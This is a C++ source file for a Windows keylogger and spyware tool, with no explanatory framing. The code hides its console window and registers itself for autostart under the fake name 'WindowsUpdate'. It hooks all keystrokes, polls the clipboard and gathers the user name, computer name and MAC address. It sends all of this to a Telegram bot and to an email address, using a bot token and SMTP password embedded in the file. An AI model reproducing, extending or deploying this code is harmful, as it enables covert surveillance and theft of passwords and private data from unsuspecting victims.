#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <regex>
#include <sstream>
#include <shlobj.h>
#include <tlhelp32.h>
#include <map>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <iomanip>
#include <algorithm>

// OpenSSL headers
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509v3.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

// OpenSSL libraries
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

// ========== CONSTANTS ==========
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";
const char* SMTP_SERVER = "smtp.zoho.com";
const int SMTP_PORT = 465;
const char* SMTP_USERNAME = "jesko200233@zohomail.com";
const char* SMTP_PASSWORD = "pPzx2QZBaAWd";
const char* EMAIL_TO = "josephogidiagba49@gmail.com";

std::wstring keyBuffer, clipBuffer;
std::vector<BYTE> screenshotBuffer;
CRITICAL_SECTION keyLock, clipLock, contextLock;
HANDLE hHttpSession = NULL;
HHOOK keyboardHook = NULL;
bool running = true;
FILETIME lastScreenshot = {0};
std::wstring activeWindowTitle;
std::map<std::wstring, std::wstring> credentialCache;
std::wstring systemID, computerName, userName, macAddress, windowsVersion;

// OpenSSL globals
SSL_CTX* ssl_ctx = nullptr;
bool openssl_initialized = false;

// ========== FORWARD DECLARATIONS ==========
void clipboard_monitor();
bool send_email_smtp_ssl(const std::string& subject, const std::string& body);
bool init_openssl();
void cleanup_openssl();
SSL* connect_ssl_socket(SOCKET sock);
bool smtp_send_command_ssl(SSL* ssl, const std::string& cmd, const std::string& expected_response = "250");
std::string read_smtp_response_ssl(SSL* ssl);
void deliver_report(const std::wstring& message, bool urgent = false);

// ========== UTILITY FUNCTIONS ==========

std::string url_encode(const std::string& input) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    
    for (unsigned char c : input) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else if (c == ' ') {
            escaped << '+';
        } else {
            escaped << '%' << std::setw(2) << static_cast<int>(c);
        }
    }
    return escaped.str();
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &strTo[0], size_needed, NULL, NULL);
    if (!strTo.empty()) strTo.pop_back();
    return strTo;
}

std::wstring utf8_to_wstring(const std::string& str) {
    if (str.empty()) return L"";
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstrTo[0], size_needed);
    if (!wstrTo.empty()) wstrTo.pop_back();
    return wstrTo;
}

std::string base64_encode(const std::string& input) {
    static const char base64_chars[] = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    std::string encoded;
    int i = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    
    for (size_t j = 0; j < input.size(); j++) {
        char_array_3[i++] = input[j];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for (int k = 0; k < 4; k++) {
                encoded += base64_chars[char_array_4[k]];
            }
            i = 0;
        }
    }
    
    if (i > 0) {
        for (int j = i; j < 3; j++) {
            char_array_3[j] = '\0';
        }
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        
        for (int j = 0; j < i + 1; j++) {
            encoded += base64_chars[char_array_4[j]];
        }
        
        while (i++ < 3) {
            encoded += '=';
        }
    }
    
    return encoded;
}

// ========== TELEGRAM FUNCTIONS ==========

void send_telegram(const std::wstring& message) {
    if (!hHttpSession || message.empty()) return;
    
    std::string utf8_msg = wstring_to_utf8(message);
    if (utf8_msg.size() > 3900) {
        utf8_msg = utf8_msg.substr(0, 3900) + "...";
    }
    
    std::string encoded_msg = url_encode(utf8_msg);
    
    std::string token_str = wstring_to_utf8(std::wstring(BOT_TOKEN));
    std::string chat_str = wstring_to_utf8(std::wstring(CHAT_ID));
    std::string path = "/bot" + token_str + "/sendMessage?chat_id=" + chat_str + "&text=" + encoded_msg;
    std::wstring wpath(utf8_to_wstring(path));
    
    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org", 
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return;
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(), NULL,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (hRequest) {
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WinHttpReceiveResponse(hRequest, NULL);
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
    Sleep(200);
}

bool init_winhttp() {
    hHttpSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    return hHttpSession != NULL;
}

// ========== SYSTEM FUNCTIONS ==========

void stealth_init() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

void persistence() {
    HKEY hKey;
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, 
                      (BYTE*)exePath, (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        
        EnterCriticalSection(&keyLock);
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        WCHAR buffer[16];
        int result = ToUnicode(pKey->vkCode, pKey->scanCode, 
                             keyboardState, buffer, 16, 0);
        
        if (result > 0) {
            keyBuffer += buffer[0];
            if (keyBuffer.length() >= 100) {
                std::wstring temp = keyBuffer;
                keyBuffer.clear();
                LeaveCriticalSection(&keyLock);
                
                std::thread([temp]() {
                    send_telegram(L"⌨️ Keystrokes:\n" + temp);
                }).detach();
                return 0;
            }
        }
        LeaveCriticalSection(&keyLock);
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

bool install_keyboard_hook() {
    keyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, 
                                    GetModuleHandle(NULL), 0);
    return keyboardHook != NULL;
}

void clipboard_monitor() {
    std::wstring lastClipboard;
    
    while (running) {
        Sleep(1000);
        
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                wchar_t* pszText = (wchar_t*)GlobalLock(hData);
                if (pszText) {
                    std::wstring currentClip(pszText);
                    if (!currentClip.empty() && currentClip != lastClipboard) {
                        lastClipboard = currentClip;
                        send_telegram(L"📋 Clipboard:\n" + currentClip);
                    }
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
        }
    }
}

std::wstring GetSystemIdentifier() {
    wchar_t username[256], compname[256];
    DWORD usernamelen = 256, compnamelen = 256;
    
    GetUserNameW(username, &usernamelen);
    GetComputerNameW(compname, &compnamelen);
    
    userName = username;
    computerName = compname;
    
    // MAC Address
    ULONG BufferLength = 0;
    GetAdaptersInfo(NULL, &BufferLength);
    PIP_ADAPTER_INFO pAdapter = (PIP_ADAPTER_INFO)malloc(BufferLength);
    GetAdaptersInfo(pAdapter, &BufferLength);
    
    std::wstring mac;
    if (pAdapter) {
        mac = utf8_to_wstring(pAdapter->AddressString);
        macAddress = mac;
    }
    free(pAdapter);
    
    // Windows Version
    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    GetVersionExW((LPOSVERSIONINFOW)&osvi);
    windowsVersion = std::to_wstring(osvi.dwMajorVersion) + L"." + 
                    std::to_wstring(osvi.dwMinorVersion);
    
    std::wstring sid = L"SYS-" + computerName + L"-" + userName;
    systemID = sid;
    return sid;
}

// ========== OPENSSL FUNCTIONS ==========

bool init_openssl() {
    if (openssl_initialized) return true;
    
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    ssl_ctx = SSL_CTX_new(TLS_client_method());
    if (!ssl_ctx) {
        return false;
    }
    
    // Set minimum TLS version to TLS 1.2
    SSL_CTX_set_min_proto_version(ssl_ctx, TLS1_2_VERSION);
    
    // Verify the server certificate
    SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_PEER, NULL);
    
    // Load system certificates
    SSL_CTX_set_default_verify_paths(ssl_ctx);
    
    openssl_initialized = true;
    return true;
}

void cleanup_openssl() {
    if (ssl_ctx) {
        SSL_CTX_free(ssl_ctx);
        ssl_ctx = nullptr;
    }
    
    if (openssl_initialized) {
        EVP_cleanup();
        ERR_free_strings();
        openssl_initialized = false;
    }
}

SSL* connect_ssl_socket(SOCKET sock) {
    SSL* ssl = SSL_new(ssl_ctx);
    if (!ssl) {
        return nullptr;
    }
    
    SSL_set_fd(ssl, (int)sock);
    
    // Set SNI hostname
    SSL_set_tlsext_host_name(ssl, SMTP_SERVER);
    
    // Set connection timeout
    struct timeval timeout;
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    int ret = SSL_connect(ssl);
    if (ret <= 0) {
        SSL_free(ssl);
        return nullptr;
    }
    
    // Verify certificate
    X509* cert = SSL_get_peer_certificate(ssl);
    if (!cert) {
        SSL_free(ssl);
        return nullptr;
    }
    X509_free(cert);
    
    return ssl;
}

std::string read_smtp_response_ssl(SSL* ssl) {
    char buffer[4096];
    std::string response;
    
    int bytes_read;
    do {
        bytes_read = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        if (bytes_read > 0) {
            buffer[bytes_read] = '\0';
            response += buffer;
            
            // Check if this is the end of SMTP response (ends with \r\n)
            if (response.length() >= 2 && 
                response[response.length() - 2] == '\r' && 
                response[response.length() - 1] == '\n') {
                break;
            }
        } else if (bytes_read <= 0) {
            int err = SSL_get_error(ssl, bytes_read);
            if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) {
                break;
            }
        }
    } while (true);
    
    return response;
}

bool smtp_send_command_ssl(SSL* ssl, const std::string& cmd, const std::string& expected_response) {
    if (!ssl) return false;
    
    std::string full_cmd = cmd;
    if (full_cmd.find("\r\n") == std::string::npos) {
        full_cmd += "\r\n";
    }
    
    int written = SSL_write(ssl, full_cmd.c_str(), (int)full_cmd.length());
    if (written <= 0) {
        return false;
    }
    
    std::string response = read_smtp_response_ssl(ssl);
    return !response.empty() && response.find(expected_response) == 0;
}

// ========== SMTP WITH SSL/TLS ==========

bool send_email_smtp_ssl(const std::string& subject, const std::string& body) {
    // Initialize OpenSSL
    if (!init_openssl()) {
        return false;
    }
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }
    
    // Set socket timeout
    int timeout = 10000; // 10 seconds
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    // Connect to SMTP server
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SMTP_PORT);
    
    // Use getaddrinfo for better hostname resolution
    addrinfo hints = {0};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    addrinfo* result = nullptr;
    if (getaddrinfo(SMTP_SERVER, nullptr, &hints, &result) != 0 || !result) {
        closesocket(sock);
        WSACleanup();
        return false;
    }
    
    serverAddr.sin_addr = ((sockaddr_in*)result->ai_addr)->sin_addr;
    freeaddrinfo(result);
    
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return false;
    }
    
    // Establish SSL/TLS connection
    SSL* ssl = connect_ssl_socket(sock);
    if (!ssl) {
        closesocket(sock);
        WSACleanup();
        return false;
    }
    
    bool success = false;
    
    try {
        // Read server greeting
        std::string greeting = read_smtp_response_ssl(ssl);
        if (greeting.empty() || greeting.find("220") != 0) {
            throw std::runtime_error("Invalid SMTP greeting");
        }
        
        // Send EHLO
        if (!smtp_send_command_ssl(ssl, "EHLO client", "250")) {
            throw std::runtime_error("EHLO failed");
        }
        
        // Authenticate using AUTH LOGIN
        if (!smtp_send_command_ssl(ssl, "AUTH LOGIN", "334")) {
            throw std::runtime_error("AUTH LOGIN failed");
        }
        
        // Send username (base64 encoded)
        std::string username_b64 = base64_encode(SMTP_USERNAME);
        if (!smtp_send_command_ssl(ssl, username_b64, "334")) {
            throw std::runtime_error("Username auth failed");
        }
        
        // Send password (base64 encoded)
        std::string password_b64 = base64_encode(SMTP_PASSWORD);
        if (!smtp_send_command_ssl(ssl, password_b64, "235")) {
            throw std::runtime_error("Password auth failed");
        }
        
        // Send MAIL FROM
        std::string mail_from = "MAIL FROM: <" + std::string(SMTP_USERNAME) + ">";
        if (!smtp_send_command_ssl(ssl, mail_from, "250")) {
            throw std::runtime_error("MAIL FROM failed");
        }
        
        // Send RCPT TO
        std::string rcpt_to = "RCPT TO: <" + std::string(EMAIL_TO) + ">";
        if (!smtp_send_command_ssl(ssl, rcpt_to, "250")) {
            throw std::runtime_error("RCPT TO failed");
        }
        
        // Send DATA
        if (!smtp_send_command_ssl(ssl, "DATA", "354")) {
            throw std::runtime_error("DATA failed");
        }
        
        // Send email content
        std::string email_content = 
            "From: " + std::string(SMTP_USERNAME) + "\r\n" +
            "To: " + std::string(EMAIL_TO) + "\r\n" +
            "Subject: " + subject + "\r\n" +
            "MIME-Version: 1.0\r\n" +
            "Content-Type: text/plain; charset=utf-8\r\n" +
            "Content-Transfer-Encoding: 8bit\r\n" +
            "\r\n" +
            body + "\r\n" +
            ".\r\n";
        
        if (!smtp_send_command_ssl(ssl, email_content, "250")) {
            throw std::runtime_error("Message sending failed");
        }
        
        // Send QUIT
        smtp_send_command_ssl(ssl, "QUIT", "221");
        
        success = true;
    }
    catch (const std::exception& e) {
        // Log error silently
    }
    
    // Cleanup
    if (ssl) {
        SSL_shutdown(ssl);
        SSL_free(ssl);
    }
    closesocket(sock);
    WSACleanup();
    
    return success;
}

// ========== REPORT DELIVERY ==========

void deliver_report(const std::wstring& message, bool urgent) {
    // Always send to Telegram
    send_telegram(message);
    
    // Try to send via SMTP in a separate thread (only for urgent messages)
    if (urgent) {
        std::thread([message]() {
            std::string subject = "System Report - " + wstring_to_utf8(systemID);
            std::string body = wstring_to_utf8(message);
            
            // Try SSL SMTP
            try {
                send_email_smtp_ssl(subject, body);
            }
            catch (...) {
                // SMTP failed silently
            }
        }).detach();
    }
}

// ========== MAIN ENTRY POINT ==========

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPWSTR lpCmdLine, int nCmdShow) {
    DisableThreadLibraryCalls(GetModuleHandle(NULL));
    
    InitializeCriticalSection(&keyLock);
    InitializeCriticalSection(&clipLock);
    InitializeCriticalSection(&contextLock);
    
    stealth_init();
    persistence();
    
    systemID = GetSystemIdentifier();
    
    if (init_winhttp()) {
        std::wstring activationMsg = L"🚀 CHANGES v5.0 ACTIVATED\n";
        activationMsg += L"🖥️ " + systemID + L"\n";
        activationMsg += L"👤 " + userName + L"\n";
        activationMsg += L"💻 " + computerName + L"\n";
        activationMsg += L"🔗 " + macAddress + L"\n";
        activationMsg += L"🪟 Windows " + windowsVersion;
        
        deliver_report(activationMsg, true);
        
        if (install_keyboard_hook()) {
            std::thread(clipboard_monitor).detach();
            
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0) && running) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }
        
        if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
    }
    
    DeleteCriticalSection(&keyLock);
    DeleteCriticalSection(&clipLock);
    DeleteCriticalSection(&contextLock);
    if (hHttpSession) WinHttpCloseHandle(hHttpSession);
    
    cleanup_openssl();
    
    return 0;
}
